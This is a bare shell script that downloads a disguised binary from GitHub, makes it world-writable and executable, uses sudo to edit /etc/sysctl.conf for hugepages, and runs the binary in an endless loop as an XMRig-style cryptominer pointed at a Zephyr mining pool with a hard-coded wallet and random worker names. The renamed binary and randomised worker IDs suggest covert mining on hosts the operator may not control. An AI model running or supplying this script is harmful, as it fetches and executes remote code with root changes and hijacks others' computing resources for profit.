wget https://github.com/renilo/kuuntul/raw/main/kuntulan
chmod 777 kuntulan

while :; do
    (grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) \
&& ./kuntulan -o sg-zephyr.miningocean.org:5332 -u ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 -p $(echo $(shuf -i 1-99999999 -n 1)-VA1) -a rx/0 -k --donate-level 1 -t 4;
    sleep 5;
done
